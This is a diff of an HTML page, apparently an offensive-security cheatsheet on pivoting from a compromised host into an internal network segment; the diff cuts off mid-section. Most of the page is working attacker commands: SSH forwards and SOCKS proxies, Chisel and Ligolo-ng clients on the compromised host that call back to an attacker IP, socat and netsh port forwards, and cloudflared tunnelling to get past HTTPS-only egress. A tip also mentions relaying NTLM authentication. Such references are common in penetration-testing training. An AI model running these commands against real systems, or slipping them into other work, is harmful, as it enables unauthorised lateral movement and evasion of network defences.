@@ -1,437 +1,100 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Pivoting | JinPwn</title><meta name="description" content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/misc/pivoting/">
-<meta property="og:title" content="Pivoting | JinPwn">
-<meta property="og:description" content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/misc/pivoting/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Pivoting | JinPwn">
-<meta name="twitter:description" content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Pivoting | JinPwn","url":"https://jinpwn.dev/cheatsheets/misc/pivoting/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Misc navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/misc/" class="cheatsheet-sidebar-section">Misc</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-sidebar-link">Tooling MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-sidebar-link">File Transfer</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/ldap/" class="cheatsheet-sidebar-link">LDAP</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-sidebar-link">Password Cracking</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-sidebar-link is-current">Pivoting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-sidebar-link">Recon (external)</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-sidebar-link">Reverse Shells</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>Pivoting</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">Pivoting</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Misc sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/misc/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-mobile-sections-link">Tooling MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-mobile-sections-link">File Transfer</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/ldap/" class="cheatsheet-mobile-sections-link">LDAP</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-mobile-sections-link">Password Cracking</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-mobile-sections-link is-current">Pivoting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-mobile-sections-link">Recon (external)</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-mobile-sections-link">Reverse Shells</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">LHOST</span><span class="o">=</span>10.10.14.1            <span class="c1">## attacker</span>
-</span></span><span class="line"><span class="cl"><span class="nv">PIVOT</span><span class="o">=</span>10.10.11.50           <span class="c1">## compromised host</span>
-</span></span><span class="line"><span class="cl"><span class="nv">INTERNAL</span><span class="o">=</span>172.16.5.0/24      <span class="c1">## target segment</span>
-</span></span></code></pre></div><h2 id="i-quick-decision" data-heading-permalink="true"><span class="heading-content">i. Quick decision</span>
-    <a class="heading-permalink" href="#i-quick-decision" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>SSH on the pivot, you have creds, only SSH allowed out -&gt; <a href="#ii-ssh-tunnels">ii. SSH tunnels</a>
-</li>
-<li>Arbitrary TCP allowed out, you control both ends -&gt; <a href="#iii-chisel">iii. Chisel</a>
-</li>
-<li>Need full L3 access (ICMP, UDP, scanning works as if local) -&gt; <a href="#iv-ligolo-ng">iv. Ligolo-ng</a>
-</li>
-<li>Only HTTPS allowed outbound -&gt; <a href="#vi-tunnel-over-https">vi. Tunnel over HTTPS</a>
-</li>
-<li>Pivot is Windows, no extra binaries allowed -&gt; netsh portproxy + SSH</li>
-</ul>
-<h2 id="ii-ssh-tunnels" data-heading-permalink="true"><span class="heading-content">ii. SSH tunnels</span>
-    <a class="heading-permalink" href="#ii-ssh-tunnels" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Local forward, expose a remote port on your loopback:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 9000:172.16.5.10:445 user@<span class="nv">$PIVOT</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Now hit 127.0.0.1:9000 on attacker, traffic exits the pivot to 172.16.5.10:445</span>
-</span></span></code></pre></div><p>Remote forward, expose your loopback to the pivot:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -R 9000:127.0.0.1:80 user@<span class="nv">$PIVOT</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Pivot can now hit 127.0.0.1:9000 and reach your local web server</span>
-</span></span></code></pre></div><p>Dynamic forward, SOCKS proxy:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -D <span class="m">1080</span> user@<span class="nv">$PIVOT</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Then on attacker</span>
-</span></span><span class="line"><span class="cl">proxychains -q nmap -sT -Pn 172.16.5.0/24
-</span></span><span class="line"><span class="cl">curl --socks5-hostname 127.0.0.1:1080 http://172.16.5.10
-</span></span></code></pre></div><p>ProxyJump for multi-hop, no shell on the intermediate boxes:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -J user1@10.10.11.50,user2@172.16.5.5 user3@10.0.0.99
-</span></span><span class="line"><span class="cl"><span class="c1">## End-to-end encrypted, no creds exposed to intermediate hops</span>
-</span></span></code></pre></div><p><code>~/.ssh/config</code> so the chain is one short alias:</p>
-<pre tabindex="0"><code>Host pivot
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Pivoting | JinPwn</title><meta name=description content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/misc/pivoting/><meta property="og:title" content="Pivoting | JinPwn"><meta property="og:description" content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/misc/pivoting/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Pivoting | JinPwn"><meta name=twitter:description content="Reach the next network segment from your foothold. Pick the tool by what the target allows outbound."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Pivoting | JinPwn","url":"https://jinpwn.dev/cheatsheets/misc/pivoting/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Misc navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/misc/ class=cheatsheet-sidebar-section>Misc</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/misc/00-tooling-moc/ class=cheatsheet-sidebar-link>Tooling MOC</a></li><li><a href=/cheatsheets/misc/file-transfer/ class=cheatsheet-sidebar-link>File Transfer</a></li><li><a href=/cheatsheets/misc/ldap/ class=cheatsheet-sidebar-link>LDAP</a></li><li><a href=/cheatsheets/misc/password-cracking/ class=cheatsheet-sidebar-link>Password Cracking</a></li><li><a href=/cheatsheets/misc/pivoting/ class="cheatsheet-sidebar-link is-current">Pivoting</a></li><li><a href=/cheatsheets/misc/recon-external/ class=cheatsheet-sidebar-link>Recon (external)</a></li><li><a href=/cheatsheets/misc/reverse-shells/ class=cheatsheet-sidebar-link>Reverse Shells</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>Pivoting</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>Pivoting</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Misc sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/misc/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/misc/00-tooling-moc/ class=cheatsheet-mobile-sections-link>Tooling MOC</a></li><li><a href=/cheatsheets/misc/file-transfer/ class=cheatsheet-mobile-sections-link>File Transfer</a></li><li><a href=/cheatsheets/misc/ldap/ class=cheatsheet-mobile-sections-link>LDAP</a></li><li><a href=/cheatsheets/misc/password-cracking/ class=cheatsheet-mobile-sections-link>Password Cracking</a></li><li><a href=/cheatsheets/misc/pivoting/ class="cheatsheet-mobile-sections-link is-current">Pivoting</a></li><li><a href=/cheatsheets/misc/recon-external/ class=cheatsheet-mobile-sections-link>Recon (external)</a></li><li><a href=/cheatsheets/misc/reverse-shells/ class=cheatsheet-mobile-sections-link>Reverse Shells</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>LHOST</span><span class=o>=</span>10.10.14.1            <span class=c1>## attacker</span>
+</span></span><span class=line><span class=cl><span class=nv>PIVOT</span><span class=o>=</span>10.10.11.50           <span class=c1>## compromised host</span>
+</span></span><span class=line><span class=cl><span class=nv>INTERNAL</span><span class=o>=</span>172.16.5.0/24      <span class=c1>## target segment</span>
+</span></span></code></pre></div><h2 id=i-quick-decision data-heading-permalink=true><span class=heading-content>i. Quick decision</span>
+<a class=heading-permalink href=#i-quick-decision aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>SSH on the pivot, you have creds, only SSH allowed out -> <a href=#ii-ssh-tunnels>ii. SSH tunnels</a></li><li>Arbitrary TCP allowed out, you control both ends -> <a href=#iii-chisel>iii. Chisel</a></li><li>Need full L3 access (ICMP, UDP, scanning works as if local) -> <a href=#iv-ligolo-ng>iv. Ligolo-ng</a></li><li>Only HTTPS allowed outbound -> <a href=#vi-tunnel-over-https>vi. Tunnel over HTTPS</a></li><li>Pivot is Windows, no extra binaries allowed -> netsh portproxy + SSH</li></ul><h2 id=ii-ssh-tunnels data-heading-permalink=true><span class=heading-content>ii. SSH tunnels</span>
+<a class=heading-permalink href=#ii-ssh-tunnels aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Local forward, expose a remote port on your loopback:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -L 9000:172.16.5.10:445 user@<span class=nv>$PIVOT</span>
+</span></span><span class=line><span class=cl><span class=c1>## Now hit 127.0.0.1:9000 on attacker, traffic exits the pivot to 172.16.5.10:445</span>
+</span></span></code></pre></div><p>Remote forward, expose your loopback to the pivot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -R 9000:127.0.0.1:80 user@<span class=nv>$PIVOT</span>
+</span></span><span class=line><span class=cl><span class=c1>## Pivot can now hit 127.0.0.1:9000 and reach your local web server</span>
+</span></span></code></pre></div><p>Dynamic forward, SOCKS proxy:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -D <span class=m>1080</span> user@<span class=nv>$PIVOT</span>
+</span></span><span class=line><span class=cl><span class=c1>## Then on attacker</span>
+</span></span><span class=line><span class=cl>proxychains -q nmap -sT -Pn 172.16.5.0/24
+</span></span><span class=line><span class=cl>curl --socks5-hostname 127.0.0.1:1080 http://172.16.5.10
+</span></span></code></pre></div><p>ProxyJump for multi-hop, no shell on the intermediate boxes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -J user1@10.10.11.50,user2@172.16.5.5 user3@10.0.0.99
+</span></span><span class=line><span class=cl><span class=c1>## End-to-end encrypted, no creds exposed to intermediate hops</span>
+</span></span></code></pre></div><p><code>~/.ssh/config</code> so the chain is one short alias:</p><pre tabindex=0><code>Host pivot
     HostName 10.10.11.50
     User pwn
 Host internal
     HostName 172.16.5.5
     User pwn
     ProxyJump pivot
-</code></pre><h2 id="iii-chisel" data-heading-permalink="true"><span class="heading-content">iii. Chisel</span>
-    <a class="heading-permalink" href="#iii-chisel" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>TCP-based, easiest reverse SOCKS, works on Linux and Windows.</p>
-<p>Server on attacker:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./chisel server -p <span class="m">8000</span> --reverse
-</span></span></code></pre></div><p>Client on pivot, reverse SOCKS:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Linux</span>
-</span></span><span class="line"><span class="cl">./chisel client 10.10.14.1:8000 R:socks
-</span></span><span class="line"><span class="cl"><span class="c1">## Windows</span>
-</span></span><span class="line"><span class="cl">.<span class="se">\c</span>hisel.exe client 10.10.14.1:8000 R:socks
-</span></span><span class="line"><span class="cl"><span class="c1">## SOCKS now listens on attacker&#39;s 127.0.0.1:1080</span>
-</span></span></code></pre></div><p>Reverse single-port forward, no SOCKS overhead:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./chisel client 10.10.14.1:8000 R:9000:172.16.5.10:445
-</span></span><span class="line"><span class="cl"><span class="c1">## Attacker&#39;s 127.0.0.1:9000 reaches the internal SMB host</span>
-</span></span></code></pre></div><h2 id="iv-ligolo-ng" data-heading-permalink="true"><span class="heading-content">iv. Ligolo-ng</span>
-    <a class="heading-permalink" href="#iv-ligolo-ng" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>TUN interface on attacker, full L3 access, faster than chisel, no proxychains needed.</p>
-<p>Attacker:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ip tuntap add user <span class="nv">$USER</span> mode tun ligolo
-</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> ligolo up
-</span></span><span class="line"><span class="cl">./proxy -selfcert
-</span></span><span class="line"><span class="cl"><span class="c1">## In ligolo prompt:</span>
-</span></span><span class="line"><span class="cl">session
-</span></span><span class="line"><span class="cl"><span class="c1">## Pick session, then:</span>
-</span></span><span class="line"><span class="cl">start
-</span></span><span class="line"><span class="cl"><span class="c1">## Add route from attacker to internal range:</span>
-</span></span><span class="line"><span class="cl">sudo ip route add 172.16.5.0/24 dev ligolo
-</span></span></code></pre></div><p>Agent on pivot:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Linux</span>
-</span></span><span class="line"><span class="cl">./agent -connect 10.10.14.1:11601 -ignore-cert
-</span></span><span class="line"><span class="cl"><span class="c1">## Windows</span>
-</span></span><span class="line"><span class="cl">.<span class="se">\a</span>gent.exe -connect 10.10.14.1:11601 -ignore-cert
-</span></span></code></pre></div><p>After <code>start</code>, every tool on attacker (nmap, nxc, ssh) routes to the internal range with no proxychains.</p>
-<div class="obsidian-callout callout-tip">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Agent-side listener</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>Need the pivot to expose a port back to attacker side? Use ligolo&rsquo;s <code>listener_add</code> to bind on the agent and forward to attacker, useful for relaying NTLM auth back through the tunnel.</p>
-  </div>
-</div>
-<h2 id="v-pure-tcp-forwards" data-heading-permalink="true"><span class="heading-content">v. Pure TCP forwards</span>
-    <a class="heading-permalink" href="#v-pure-tcp-forwards" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>socat one-shot port forward, no extra tooling:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## On pivot, forward pivot:9000 -&gt; 172.16.5.10:445</span>
-</span></span><span class="line"><span class="cl">socat TCP-LISTEN:9000,fork,reuseaddr TCP:172.16.5.10:445
-</span></span></code></pre></div><p>Windows netsh, built-in:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy add v4tov4 listenport=9000 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.5.10
-</span></span><span class="line"><span class="cl">netsh interface portproxy show all
-</span></span><span class="line"><span class="cl">netsh interface portproxy delete v4tov4 listenport=9000 listenaddress=0.0.0.0
-</span></span></code></pre></div><h2 id="vi-tunnel-over-https" data-heading-permalink="true"><span class="heading-content">vi. Tunnel over HTTPS</span>
-    <a class="heading-permalink" href="#vi-tunnel-over-https" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When outbound is HTTPS only. Wrap chisel or ligolo in cloudflared.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Attacker</span>
-</span></span><span class="line"><span class="cl">chisel server -p <span class="m">8000</span> --reverse <span class="p">&amp;</span>
-</span></span><span class="line"><span class="cl">cloudflared tunnel --url tcp://localhost:8000 --no-autoupdate
-</span></span><span class="line"><span class="cl"><span class="c1">## cloudflared prints a https://random.trycloudflare.com URL</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Pivot</span>
-</span></span><span class="line"><span class="cl">cloudflared access tcp --hostname random.trycloudflare.com --url localhost:8000 <span class="p">&amp;</span>
-</span></span><span class="line"><span class="cl">./chisel client 127.0.0.1:8000 R:socks
-</span></span></code></pre></div><p>See <a href="https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service" target="_blank" rel="noopener noreferrer">THC&rsquo;s iq article</a>
- for the gost + cloudflared pattern.</p>
-<h2 id="vii-proxychains-config" data-heading-permalink="true"><span class="heading-content">vii. ProxyChains config</span>
-    <a class="heading-permalink" href="#vii-proxychains-config" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p><code>/etc/proxychains.conf</code> (or <code>~/.proxychains/proxychains.conf</code>):</p>
-<pre tabindex="0"><code>strict_chain
+</code></pre><h2 id=iii-chisel data-heading-permalink=true><span class=heading-content>iii. Chisel</span>
+<a class=heading-permalink href=#iii-chisel aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>TCP-based, easiest reverse SOCKS, works on Linux and Windows.</p><p>Server on attacker:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./chisel server -p <span class=m>8000</span> --reverse
+</span></span></code></pre></div><p>Client on pivot, reverse SOCKS:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Linux</span>
+</span></span><span class=line><span class=cl>./chisel client 10.10.14.1:8000 R:socks
